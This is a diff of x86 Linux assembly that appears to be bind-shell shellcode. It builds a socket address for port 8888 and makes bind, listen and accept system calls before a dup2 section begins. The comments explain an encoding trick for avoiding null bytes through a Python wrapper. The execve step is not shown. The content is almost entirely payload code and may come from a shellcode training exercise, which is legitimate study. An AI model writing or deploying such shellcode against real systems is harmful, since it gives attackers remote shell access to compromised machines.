@@ -46,13 +46,12 @@ _start:
 	mov edi, 0x12111190 	; 0x12111190 = 0x100007F + 0x11111111
 	sub edi, 0x11111111 	; 0x11111111 is an aux value. It can change to 0x22222222, 0x33333333 with the Python wrapper if IP+0x11111111 has NOPs
 	push edi  				; The real IP gets stored. In this case ip = 127.0.0.1, big endian
-    push dword 0xb8220002
+    push word 0xb822 		; Port 8888, big endian
+    push word 2 			; sin_family value is 2
 	mov ecx, esp 			; $ecx = 0x2, port, ip
 	mov dl, 0x66
 	push ebx			; File descriptor gets pushed to stack again
 	int 0x80
-
-	xor edx, edx
 
 	; Listen - 363
 	xor eax, eax
@@ -68,9 +67,10 @@ _start:
 	pop ebx 			; $ebx = File descriptor address
 	xor ecx, ecx 		; $ecx = addr = 0, local address
 	xor edx, edx
-	mov dl, 0x66 		; $edx = Address length is 16 bits 
+	mov dl, 0x10 		; $edx = Address length is 16 bits 
 	int 0x80
 	push eax			; New file descriptor gets pushed to stack
+
 
 	;dup2 - 0
 	xor eax, eax
